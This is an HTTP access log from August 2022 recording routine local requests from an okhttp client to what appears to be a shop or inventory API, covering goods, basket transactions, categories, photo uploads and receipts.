::ffff:127.0.0.1 - - [14/Aug/2022:08:55:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:55:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:55:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:55:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:55:06 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:55:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:55:19 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:55:20 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:55:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:55:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:55:31 +0000] "GET /api/v1/goods/user?limit=100&select=quantity%20price%20photo%20name HTTP/1.0" 200 1110 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:55:31 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:55:31 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:55:31 +0000] "GET /upload/no-photo.jpg HTTP/1.0" 404 158 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:55:33 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:55:33 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:56:20 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:56:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:56:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:56:54 +0000] "POST /api/v1/goods HTTP/1.0" 200 356 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:56:54 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:56:54 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 2180 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:57:01 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:57:01 +0000] "GET /api/v1/goods/62f8b8d68e470b4b6899c053 HTTP/1.0" 200 414 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:57:01 +0000] "GET /api/v1/transactions/user?good=62f8b8d68e470b4b6899c053&sort=-createdAt HTTP/1.0" 200 119 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:57:01 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:57:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:57:05 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:57:44 +0000] "PUT /api/v1/goods/62f8b8d68e470b4b6899c053 HTTP/1.0" 200 356 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:58:19 +0000] "PUT /api/v1/goods/62f8b8d68e470b4b6899c053 HTTP/1.0" 200 356 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:58:25 +0000] "PUT /api/v1/goods/62f8b8d68e470b4b6899c053/upload-photo HTTP/1.0" 200 60 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:58:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 2202 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:58:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:58:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:58:56 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:59:13 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:59:13 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 462 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:59:13 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 462 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:59:19 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 284 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:59:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:59:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:59:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:59:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 2204 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:59:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:59:43 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:59:47 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:59:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:59:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
